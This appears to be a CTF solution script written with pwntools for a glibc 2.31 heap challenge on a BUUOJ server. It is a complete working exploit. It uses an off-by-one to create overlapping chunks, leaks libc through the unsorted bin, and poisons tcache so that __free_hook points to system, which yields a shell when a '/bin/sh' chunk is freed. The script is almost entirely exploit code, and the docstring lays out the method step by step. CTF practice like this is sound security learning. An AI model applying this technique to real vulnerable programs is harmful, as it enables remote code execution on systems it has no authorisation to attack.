'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. off-by-one modify size of next chunk to construct overlapping chunks (add 0x*8 chunk to overlaping chunks)
2. modify chunk with larger size to write next next chunk
3. constructing unsorted bin chunk with size 0x440
4. leak libc through **unsorted bin attack** (*add one more chunk* to split unsorted bin from top chunk, besides *add tcache chunk* to cut the 0x440 chunk to trigger unsorted bin collection, put the 0x400 chunk into unsorted bin | `first unsorted bin's fd - 0x70 == __malloc_hook` address
5. chunk overlapping to write tcache fd to `__free_hook` 
6. **tcache attack** | add chunk `__free_hook` address, hijacking it to `system` | tcache counts chunks number, makesure the count of chunks is correct
7. add chunk with content `"/bin/sh"`, free it to get shell
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "28898" 
filename = "./pwn"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6'
remote_libc = './libc.so.6'
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B(tag=1):
    if tag: gdb.attach(io)
    pause()

def Add(size, content):
    io.sendlineafter(b'Your Choice: ', b'1')
    io.sendlineafter(b'size: \n', str(size).encode())
    io.sendafter(b'content: \n', content)

def Show(idx):
    io.sendlineafter(b'Your Choice: ', b'2')
    io.sendlineafter(b'idx: \n', str(idx).encode())

def Del(idx):
    io.sendlineafter(b'Your Choice: ', b'3')
    io.sendlineafter(b'idx: \n', str(idx).encode())

def pwn():
    Add(0x18, b'fa1c4')
    Add(0x18, b'fa1c4') # 0x60
    Add(0x38, b'fa1c4') # 0x440
    
    Add(0x78, b'fa1c4') # 0x400
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'fa1c4')
    Add(0x78, b'/bin/sh\x00')

    Del(0)
    # B()
    Add(0x18, cyclic(0x18) + b'\x61') # off-by-one to modify the size of the next chunk to 0x61
    Del(1)
    Add(0x58, b'f' * 0x18 + p64(0x441))

    # leak libc through unsorted bin attack
    Del(2)
    Add(0x38, b'fa1c4') # add 0x38 to trigger unsorted bin attack
    Show(3) # use after free logic vuln in managing structure, to show unsorted bin chunk 
    # B()
    io.recvuntil(b'the content: \n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    free_hook_addr = libc.sym['__free_hook']
    system_addr = libc.sym['system']
    log.success(f'libc -> {hex(libc.address)}')
    log.success(f'free_hook_addr -> {hex(free_hook_addr)}')
    log.success(f'system_addr -> {hex(system_addr)}')

    Add(0x38, b'fa1c4')
    Del(3) # makesure tcache has 2 chunks
    Del(2) # tcache attack to hijack __free_hook to system
    Del(1) # 0x60 overlapping chunk to write 0x40 chunk fd
    Add(0x58, cyclic(0x18) + p64(0x41) + p64(free_hook_addr))
    # B()
    Add(0x38, b'fa1c4') # 0x40 Del(2)
    Add(0x38, p64(system_addr)) # 0x40 Del(3)
    Del(11)


if __name__ == "__main__":
    pwn()
    io.interactive()
